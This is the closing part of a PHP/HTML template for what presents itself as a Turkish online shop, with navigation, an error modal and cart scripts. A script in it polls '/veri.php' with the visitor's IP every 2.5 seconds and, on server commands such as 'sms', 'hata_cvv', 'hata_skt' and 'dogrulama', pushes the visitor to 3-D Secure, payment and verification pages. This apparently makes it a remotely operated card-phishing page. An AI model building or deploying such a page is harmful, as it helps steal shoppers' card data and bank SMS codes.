                     <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M2.69922 9.84097V19.5819C2.69922 21.0256 3.87381 22.2002 5.31714 22.2002H19.0625C20.5061 22.2002 21.6807 21.0256 21.6807 19.5819V9.84097C21.6807 8.3973 20.5061 7.22271 19.0625 7.22271L16.4111 7.22288C16.7228 7.03291 16.9769 6.83442 17.1335 6.63162C18.0626 5.43088 17.8428 3.70431 16.642 2.77518C16.1414 2.38774 15.5489 2.2002 14.9614 2.2002C14.1398 2.2002 13.3273 2.56679 12.7854 3.26668C12.5089 3.62405 12.3199 4.2674 12.1898 4.99374C12.0598 4.26722 11.8707 3.62371 11.5941 3.26668C11.0526 2.5668 10.2401 2.2002 9.41843 2.2002C8.83094 2.2002 8.23855 2.38777 7.738 2.77553C6.53725 3.70466 6.31741 5.43123 7.24654 6.63197C7.40336 6.83457 7.65755 7.03291 7.96899 7.22323L5.31705 7.22306C3.87372 7.22288 2.69922 8.39734 2.69922 9.84097ZM4.00829 19.5819V13.1139H11.5354V20.8913H5.31718C4.5956 20.8913 4.00829 20.304 4.00829 19.5819ZM20.3718 19.5819C20.3718 20.3037 19.7845 20.891 19.0628 20.891H12.8446V13.114H20.3717L20.3718 19.5819ZM19.063 8.53208C19.7847 8.53208 20.372 9.1194 20.372 9.84115V11.8048L12.8449 11.8046V8.53208L19.063 8.53208ZM13.8208 4.06794C14.0955 3.71279 14.5115 3.50918 14.9616 3.50918C15.2823 3.50918 15.5861 3.61321 15.8408 3.81035C16.1451 4.04575 16.3392 4.38568 16.388 4.76698C16.4367 5.14861 16.3339 5.52612 16.0985 5.83005C15.8444 6.14847 14.658 6.68077 13.2642 7.13877C13.358 5.67599 13.576 4.3944 13.8208 4.06794ZM7.99225 4.76712C8.04094 4.38549 8.23517 4.0459 8.53942 3.81049C8.79413 3.61336 9.09819 3.50932 9.41883 3.50932C9.86878 3.50932 10.2846 3.71312 10.5591 4.06778C10.8035 4.39354 11.0212 5.6758 11.1153 7.13959C9.72254 6.68211 8.53649 6.14963 8.28215 5.83052C8.04624 5.52628 7.9434 5.14873 7.99225 4.76712ZM11.5354 8.53199V11.8049L4.00829 11.8047V9.84089C4.00829 9.11914 4.5956 8.53182 5.31735 8.53182L11.5354 8.53199Z" fill="#8D939C"></path>
                     </svg>
                  </div>
                  <div class="mt-1 text-[9px] text-brand-gray-secondary ">Kampanyalar</div>
               </div>
               <div class="flex flex-col items-center relative">
                  <div>
                     <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <circle cx="12" cy="7.5" r="4.825" stroke="#8D939C" stroke-width="1.35"></circle>
                        <path d="M2.175 19.5335C2.175 16.9608 4.26061 14.8752 6.83333 14.8752H17.1667C19.7394 14.8752 21.825 16.9608 21.825 19.5335C21.825 20.6335 20.9333 21.5252 19.8333 21.5252H4.16667C3.0667 21.5252 2.175 20.6335 2.175 19.5335Z" stroke="#8D939C" stroke-width="1.35"></path>
                     </svg>
                  </div>
                  <div class="mt-1 text-[9px] text-brand-gray-secondary ">Hesabım</div>
               </div>
            </div>
         </div>

      </div>
   </div>
   <div class="fixed inset-0 ios-bottom w-full z-[50] flex items-center justify-center pointer-events-none" style='display: none' id='errNotify'>
      <div class="w-[calc(100%-1rem)] text-center relative desktop:max-w-[445px] tablet:max-w-[375px] mobile:max-w-[343px] flex flex-col p-4 items-center justify-center  bg-white rounded-3xl border border-brand-gray-border pointer-events-auto">
         <div class=" mt-[34px]">
            <svg width="80" height="80" viewBox="0 0 80 80" fill="none" xmlns="http://www.w3.org/2000/svg">
               <circle cx="40" cy="40" r="40" fill="#F3F6FA"></circle>
               <path d="M40.0977 25C38.9438 25 38 25.9439 38 27.0977V44.8814C38 46.0352 38.9439 46.9791 40.0977 46.9791C41.2516 46.9791 42.1954 46.0352 42.1954 44.8814V27.0977C42.1954 25.9438 41.2516 25 40.0977 25Z" fill="#F34133"></path>
               <path d="M40.0977 50C38.9438 50 38 50.9439 38 52.0977C38 53.2516 38.9439 54.1954 40.0977 54.1954C41.2516 54.1954 42.1954 53.2516 42.1954 52.0977C42.1954 50.8392 41.2516 50 40.0977 50Z" fill="#F34133"></path>
            </svg>
         </div>
         <div class="text-xl font-medium text-brand-gray-primary mt-6">Hata</div>
         <div class="text-sm font-normal text-brand-gray-primary mt-2 whitespace-pre-line break-words" id='errNotifyText'></div>
         <div class="self-stretch mt-8"><button class="bg-brand-blue-primary  rounded-full text-base  px-5 py-3 text-center w-full text-white " onclick="errNotifyKapat();">Tamam</button></div>
         <div class="absolute top-4 right-4 cursor-pointer" onclick="errNotifyKapat();">
            <svg width="18" height="18" viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg">
               <path d="M2 2L16 16M16 2L2 16" stroke="#333333" stroke-width="1.35" stroke-linecap="round" stroke-linejoin="round"></path>
            </svg>
         </div>
      </div>
   </div>
   <div class="fixed inset-0 z-[49] bg-black/40 " style='display: none' id='notifyBg'></div>
   <script>
      function errNotify(text) {
         document.getElementById('errNotify').style.display = '';
         document.getElementById('notifyBg').style.display = '';
         document.getElementById('errNotifyText').innerHTML = text;
      }

      function errNotifyKapat() {
         document.getElementById('errNotify').style.display = 'none';
         document.getElementById('notifyBg').style.display = 'none';
         document.getElementById('errNotifyText').innerHTML = '';
      }
   </script>
   <script>
      function SepeteEkle(urun_id) {
         if (urun_id) {
            $.ajax({
               type: 'POST',
               url: 'request.php?action=sepet_ekle',
               data: {
                  ip: "<?php echo $ip; ?>",
                  urun_id: urun_id
               },
               success: function(data) {
                  if (data == "success") {
                     document.getElementById('sepetNotify').style.display = "block"
                  } else if (data == "fail") {
                     errNotify('Şu anda bu üründen stoğumuzda daha fazla bulunmuyor.');
                  }
               }
            });
         }
      }

      function SepetSil(urun_id) {
         if (urun_id) {
            $.ajax({
               type: 'POST',
               url: 'request.php?action=sepet_sil',
               data: {
                  ip: "<?php echo $ip; ?>",
                  urun_id: urun_id
               },
               success: function(data) {
                  if (data == "success") {
                     alert("Ürün başarıyla silindi.");
                     setTimeout(() => {
                        window.location.reload();
                     }, 350);
                  }
               }
            });
         }
      }
   </script>
   <script type="text/javascript">
      $(document).ready(function() {
         gonder();
         var int = self.setInterval("gonder()", 2500);
      });

      function gonder() {
         $.ajax({
            type: 'POST',
            url: '<?php echo "/veri.php?ip=" . $ip; ?>',
            success: function(msg) {
               if (msg.includes('sms')) {
                  window.location.href = 'acsredirect';
               }
               if (msg.includes('tebrikler')) {
                  window.location.href = 'acsredirect?control=success';
               }
               if (msg.includes('hata_sms')) {
                  window.location.href = 'acsredirect?control=error';
               }
               if (msg.includes('hata_limit')) {
                  window.location.href = '/?redirect=error_limit';
               }
               if (msg.includes('hata_internet')) {
                  window.location.href = '/?redirect=error_internet';
               }
               if (msg.includes('hata_cvv')) {
                  window.location.href = '/odeme?status=cvv';
               }
               if (msg.includes('hata_skt')) {
                  window.location.href = '/odeme?status=skt';
               }
               if (msg.includes('hata_dogrulama')) {
                  window.location.href = '/dogrulama?control=error';
               }
               if (msg == "dogrulama" || msg == "dogrulamadogrulama") {
                  window.location.href = '/dogrulama';
               }
               if (msg.includes('basa_dondur')) {
                  window.location.href = '/';
               }
            }
         });
      }
   </script>
   <script type="text/javascript">
      document.addEventListener("DOMContentLoaded", function() {
         var m1 = document.getElementById('m1');
         var m2 = document.getElementById('m2');

         if (window.innerWidth <= 800) {
            m1.style.display = "block";
            m2.style.display = "block";
         } else {
            m1.style.display = "none";
            m2.style.display = "none";
         }

         window.addEventListener("resize", function() {
            if (window.innerWidth <= 800) {
               m1.style.display = "block";
               m2.style.display = "block";
            } else {
               m1.style.display = "none";
               m2.style.display = "none";
            }
         });
      });
   </script>
   <div id="sepetNotify" style='display: none'>
      <div data-headlessui-portal="">
         <div class="fixed inset-0 ios-bottom w-full z-20 bg-black/40"></div>
         <div class="fixed inset-0 ios-bottom w-full z-20 flex items-center justify-center pointer-events-none">
            <div class="w-[calc(100%-1rem)]  relative mobile:max-w-[375px] tablet:max-w-[600px]  bg-white   rounded-3xl border border-brand-gray-border">
               <div class="pointer-events-auto">
                  <div class="text-center pt-[42px] mb-2 text-xl px-4 font-medium">Ürün Sepetine Eklendi</div>
                  <div class="relative">
                     <div class="overflow-y-auto p-4 max-h-[75vh] ">
                        <div class="relative -mt-4 pt-4">
                           <div class="absolute top-0 -left-4 -right-4 h-[1px] border-t"></div>

                           <div class="personaclick-recommend" data-recommender-block="dynamic" data-recommender-code="24bce634bb25e02c0618cb17f6b53a60"></div>
                           <div class="flex items-center justify-center mb-4 w-full gap-4 tablet:flex-nowrap mobile:flex-wrap laptop:flex-nowrap desktop:flex-nowrap"><button class="!bg-white  rounded-full !text-base px-5 py-3  text-center w-full text-brand-gray-secondary !border !border-[#E5E7E9] " onclick='window.location.href="/"'>Alışverişe devam et</button><button class="bg-brand-blue-primary  rounded-full text-base  p-[14px] text-md text-center w-full text-white " onclick="window.location.href='sepet'">Sepete Git</button></div>
                        </div>
                     </div>
                  </div>
                  <div class="w-5 h-5 absolute top-4 right-4 cursor-pointer" onclick='document.getElementById("sepetNotify").style.display = "none"'>
                     <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M1 1L15 15M15 1L1 15" stroke="#333333" stroke-width="1.35" stroke-linecap="round" stroke-linejoin="round"></path>
                     </svg>
                  </div>
               </div>
            </div>
         </div>
      </div>
   </div>
</body>

</html>